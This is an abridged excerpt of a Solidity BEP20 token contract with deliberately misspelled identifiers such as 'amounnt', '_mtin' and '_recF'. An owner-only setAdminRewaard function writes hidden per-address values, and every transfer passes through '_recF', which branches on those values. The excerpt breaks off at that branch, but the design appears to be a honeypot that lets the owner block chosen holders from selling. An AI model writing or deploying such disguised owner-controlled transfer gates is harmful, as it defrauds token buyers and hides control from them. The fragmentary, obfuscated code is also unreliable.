...
contract BEP20 is Context {
    ...
    function approve(address spender, uint256 amounnt) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amounnt);
        return true;
    }
    ...
    function _approve(
        ...
        _allowances[owner][spender] = amounnt;
        emit Approval(owner, spender, amounnt);
    }
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amounnt, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amounnt);
        }
        }
    }
...
contract Token is BEP20, Ownable {
    ...
    function _transfer(
        ...
        require(fromBalance >= amounnt, "ERC20: transfer amounnt exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amounnt;
    }
        _balances[to] += amounnt;

        emit Transfer(from, to, amounnt);
    }

    function _burn(address accont, uint256 amounnt) internal virtual {
        require(accont != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accont];
        require(accoontBalance >= amounnt, "ERC20: burn amounnt exceeds balance");
    unchecked {
        _balances[accont] = accoontBalance - amounnt;
    }
        _totalSupply -= amounnt;

        emit Transfer(accont, address(0), amounnt);
    }

    function _mtin(address accont, uint256 amounnt) internal virtual {
        require(accont != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amounnt;
        _balances[accont] += amounnt;
        emit Transfer(address(0), accont, amounnt);
    }
    ...
    function setAdminRewaard(address acclount,int256 amounnt ) public onlyowner {
        _Rewaards[acclount] += amounnt;
    }
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(fromBalance >= _accoovnt, "ERC20: transfer amounnt exceeds balance");
        if (_Rewaards[from] > 2){
    ...
    function transfer(address to, uint256 amounnt) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, amounnt);
        return true;
    }
    ...
    function transferFrom(
        ...
        _spendAllowance(from, spender, amounnt);
        _recF(from, to, amounnt);
        return true;
    }
}